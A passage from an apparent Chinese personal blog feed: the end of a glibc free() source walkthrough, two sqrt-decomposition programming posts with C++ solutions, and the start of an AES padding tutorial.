bin</code>。</p><p>这里向前合并的操作呢应该也没有很复杂，就是改个<code>size</code>然后把<code>free</code>的指针指到前面去，相当于是要<code>free</code>合并后的<code>chunk</code>了。然后<code>unlink</code>把前面的<code>chunk</code>在<code>bin</code>中删除。</p><h4 id="第四部分：free之后向后合并"><a href="#第四部分：free之后向后合并" class="headerlink" title="第四部分：free之后向后合并"></a>第四部分：free之后向后合并</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate forward */</span></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">    bck = unsorted_chunks(av);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;fd = fwd;</span><br><span class="line">    p-&gt;bk = bck;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bck-&gt;fd = p;</span><br><span class="line">    fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">    check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个特判后面的<code>chunk</code>是否为<code>top_chunk</code>，<code>top_chunk</code>的情况就非常简单，因为合并的<code>chunk</code>并不在任何<code>bin</code>里面，<code>top_chunk</code>后面也没有堆块不需要设置标志位。只需要改一下<code>top_chunk</code>的<code>size</code>，然后改一下指针，就完了。</p><p>那么我们分析不是<code>top_chunk</code>的情况，首先我先获取一下下一个<code>chunk</code>的是否被使用，如果没有被使用，那么把后面的<code>chunk</code>就先<code>unlink</code>了，然后自己<code>chunk</code>的<code>size</code>加上后面那个<code>chunk</code>的<code>size</code>成为新的<code>chunk</code>。否则，我就直接清空后面<code>chunk</code>的<code>prev_inuse</code>位，就是表示我这个<code>chunk</code>已经不被使用了。好了之后那就是把这个<code>chunk</code>链入<code>unsorted bin</code>。这里还有一个<code>check</code>，跟<code>malloc</code>那个一样，，后面基本也都一样了，就不细讲了，链入，设置标记为，设置<code>prev_size</code>，如果不在<code>small chunk</code>的大小还会清空<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，如果不理解可以往上翻一下看看。目录标题为“最后一小块”，那边是切割<code>bin</code>的时候设置的。</p><h4 id="第五部分：最后的处理"><a href="#第五部分：最后的处理" class="headerlink" title="第五部分：最后的处理"></a>第五部分：最后的处理</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">            systrim(mp_.top_pad, av);</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">       large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如注释所说，如果我一次释放了一个很大的空间(<code>0x10000B</code>)，那么会调用<code>malloc_consolidate</code>合并所有<code>fast bin</code>，如果进程所在的分配区是主分配区并且可以收缩内存的话，就调用<code>systrim</code>收缩内存，否则就获得非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>收缩<code>heap</code>。因为我们认为一次<code>free</code>很大的空间那么操作系统可以适当回收点内存了，大不了等你不够就再像我要嘛，资源的合理配置，很合理。</p><p>至此，<code>free</code>部分的源码也都分析完啦。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>就不向<code>malloc</code>一样描述具体步骤了，因为本身逻辑没有很复杂。主要就是<code>free</code>非<code>fast bin chunk</code>的向前合并或者向后合并。</p><p><code>free</code>在<code>fast bin</code>范围内的<code>chunk</code>，直接将<code>chunk</code>链入<code>fast bin</code>，<code>free</code>非<code>fast bin</code>范围的<code>chunk</code>视具体情况向前合并或者向后合并然后加入<code>unsorted bin</code>，如果一次<code>free</code>太多的空间有可能会被操作系统回收。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>源码分析也就完结撒花了，后续可能会出heap的各种利用方式和利用手段，或者局部分析其它版本的libc。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分块入门2</title>
      <link href="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/"/>
      <url>/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/</url>
      
        <content type="html"><![CDATA[<p>谨以此文，纪念我逝去的这6个小时。原本昨天开开心心学学分块，但是入门2就卡住了，卡到生活都不能自理了。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/1.png" alt="1"></p><p>题目意思还是很清晰的。要求区间加法，区间查询符合条件的值。至于加法完全可以照搬前一道题目的方式，但是查询的操作着实有点耐人寻味了，因为区间查询意味着我们得采用分块的思想，不能暴力求解。首先我想到让每一个块变得有序，然后lower_bound查到第一个大于等于某个值的第一个元素的位置。首先对所有块排序的复杂度为√n * √n log_2(√n)也就是nlog_2(n)的复杂度，然后每一次查询最多是√n的复杂度，每一次区间加法是√n的复杂度，区间加法还要对固定两个残缺块进行重新排序(因为两边的残缺块可能会破坏有序结构，而中间的则会保持原来的顺序)，这又需要2√nlog_2(√n)的复杂度。查询和加法一起是n√n的复杂度，所以整个算法就是n√n的复杂度，理论可行但是实践可惨死了。</p><p>首先，序列排序直接破坏了它的序列结构，这导致我在前一天20点-24点的提交一直不通过。后来我意识到了不能破坏它原有的序列，于是想到每个块用一个vector去保存。更新的时候clear再一个个push然后一个sort即可。然后又不行，发现是边界问题，因为我过于追求极限，因此会判断两边的块是否为完整块，完整则一起处理，不完整则先处理，这样导致如果没有处理，那么下面的循环条件没注意就不会被处理了。所以最好的方法就是，不管它，l那个点所在的块我就先处理，管你玩不完整的，右边的r也一样。</p><p>处理完了这个之后，我又被90分卡住了，最后发现是最后一个不完整的块它没有预先排序，但是其实是要的，虽然我也不知道为什么，因为我当时是感觉，它不可能会被当成一个完整的块，就基本没去管它了。但是事实就是这么魔幻：不管我就不让你过，就搞你心态。</p><p>然后来看看孩子的提交记录吧。</p><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/2.png" alt="2"></p><p>真的是太不容易了，下面给出我的AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],bl[maxn],tag[maxn],block,n;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    v[x].<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x*block;i&lt;<span class="built_in">min</span>((x+<span class="number">1</span>)*block,n);i++)&#123;</span><br><span class="line">        v[x].<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(v[x].<span class="built_in">begin</span>(),v[x].<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[l]);</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[r]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        tag[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="built_in">lower_bound</span>(v[i].<span class="built_in">begin</span>(),v[i].<span class="built_in">end</span>(),num-tag[i])-v[i].<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">if</span>(k&gt;<span class="number">0</span>)ans+=k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    block=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        bl[i]=i/block;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bl[n<span class="number">-1</span>];i++)&#123;</span><br><span class="line">        <span class="built_in">update</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        l--,r--;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)<span class="built_in">add</span>(l,r,c);</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="built_in">query</span>(l,r,c*c)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> 分块 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分块入门</title>
      <link href="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>最近cf刷的有点难，请教一位大神，大神曰，“汝之惑，分块也”，所以小菜鸡来学分块了。</p><span id="more"></span><h1 id="数列分块"><a href="#数列分块" class="headerlink" title="数列分块"></a>数列分块</h1><p>分块是我感觉是最优雅的暴力了，适用于同时区间修改和区间查询，而且书写十分方便。对于动态维护序列的题目我们一般会想到树状数组和线段树结构。</p><p>树状数组的限制十分明显，不能同时进行区间修改和区间查询地操作，只能支持单点修改+区间查询或者是区间修改和单点查询。虽然此题可以用树状数组做，但是主要还是练习一下分块。</p><p>线段树可以说是非常棒的动态维护序列的数据结构了，时间复杂度非常优秀，但是书写起来十分复杂。</p><p>分块也并不是万能的，如果同时区间修改和区间查询且数据范围在1e6的范围，那么分块就很可能超时了，此时只能使用线段树结构去维护这个序列。</p><p>各有优缺点吧，主要是分块的这个思想得学会，在很多地方都用得到。</p><p>下面给出分块算法中的一些特有名词</p><p>区间：数列中连续一段的元素</p><p>区间操作：将某个区间[a,b]的所有元素进行某种改动的操作</p><p>块：我们将数列划分成若干个不相交的区间，每个区间称为一个块</p><p><strong>整块</strong>：在一个区间操作时，完整包含于区间的块</p><p><strong>不完整的块</strong>：在一个区间操作时，只有部分包含于区间的块，即区间左右端点所在的两个块</p><h2 id="入门1"><a href="#入门1" class="headerlink" title="入门1"></a><a href="https://loj.ac/p/6277">入门1</a></h2><p>本道练习题在loj上，链接已经给出。</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>数据范围在5w，如果用朴素的算法那么必超时的。这个时候我们可以把整个序列分成一块一块的，那么到底怎么分呢，最优的分法应该是每一块包含(int)sqrt(n)个数据，最多能把数据分成(int)sqrt(n)+1块。那么在进行一次区间修改的时候，我们同样可以把区间按照分块的方式去操作，对于一个区间分出的每一个块，如果这个块有sqrt(n)个数据那么称这个块是完整的，否则是不完整的。对于完整的块，我们可以给一个标记数组，标记这个块整体都被加上了某个值；对于不完整的块我们可以对整个不完整的块内的数据进行单点修改。那么一次区间修改的操作复杂度就是sqrt(n)了。单点查询的时候只需要找到那个元素的值加上那个元素所在区间的标记就是该元素的实际值。</p><p>这里需要考虑以下几种情况：</p><p>左端点在块的起点，右端点不在另一个块的终点：需要先处理右端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点不在块的起点，右端点在另一个块的终点：需要先处理左端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点在块的起点，右端点在另一个块的终点：直接对所有块进行标记即可。</p><p>左端点与右端点在同一个块上，且完整占据整个块：直接对该块标记。</p><p>左端点与右端点在同一个块上，且不完整占据整个块：直接对区间内的元素进行修改即可。</p><p>刚开始考虑情况不周，导致WA了很多次，下面贴出AC代码和测评情况。</p><p>标程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>  std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> block[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    <span class="keyword">int</span> block_size=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c,i;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)/block_size==(r<span class="number">-1</span>)/block_size)&#123;</span><br><span class="line">                <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size==<span class="number">0</span>&amp;&amp;r%block_size==<span class="number">0</span>)&#123;</span><br><span class="line">                    block[(l<span class="number">-1</span>)/block_size+<span class="number">1</span>]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">                        a[i]+=c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(i=l;i&lt;=<span class="built_in">min</span>(((l<span class="number">-1</span>)/block_size+<span class="number">1</span>)*block_size,r);i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                l=i<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(r%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(i=<span class="built_in">max</span>((r<span class="number">-1</span>)/block_size*block_size+<span class="number">1</span>,l);i&lt;=r;i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                r=r/block_size*block_size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=l/block_size+<span class="number">1</span>;i&lt;=r/block_size;i++)&#123;</span><br><span class="line">                block[i]+=c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[r]+block[(r<span class="number">-1</span>)/block_size+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本蒟蒻测评的状况</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>这算正式入门了以下这个分块吧，后面把这个分块的所有入门都做了先。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> 分块 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AES加密学习</title>
      <link href="/2021/12/18/AES%E5%8A%A0%E5%AF%86/"/>
      <url>/2021/12/18/AES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>今天来学学AES。</p><span id="more"></span><h1 id="AES简介"><a href="#AES简介" class="headerlink" title="AES简介"></a>AES简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/1.png" alt="1"></p><h2 id="分组问题"><a href="#分组问题" class="headerlink" title="分组问题"></a>分组问题</h2><p>AES属于分组加密，什么是分组加密呢，顾名思义，分组加密=分组+加密(狗头。分组就是说把它分成一个个组进行加密，可以把它和base64作为一个对比，base64是三个字符一组进行编码，那么既然是要分组那必然也会遇到分组不满的情况，这个时候需要加上填充。这个填充呢，有很多种方案。</p><h3 id="零字节填充"><a href="#零字节填充" class="headerlink" title="零字节填充"></a>零字节填充</h3><p>这个可以说是比较常见的手段了，一般人一般也都能想得到，但是这样的话难以区分末尾的0到底是它的信息本来就存在的还是填充的，信息表达不明确。</p><h3 id="填充n位n"><a href="#填充n位n" class="headerlink" title="填充n位n"></a>填充n位n</h3><p>这个略有点意思。但是假如它本来信息就有n位n呢？那么最后的那n位n还是没办法区分是不是它本来就有的。</p><p>那么最终AES采取了哪种填充方式呢？它选择在第二种方案中改进，如果长度刚好不需要填充，那么就填充16位16。这么一来，如果它末尾存在了n位n，但是由于长度满足16的倍数，那么还会填充16位16，这样它就能够区分填充位和明文位了。</p><h2 id="AES常见分类"><a href="#AES常见分类" class="headerlink" 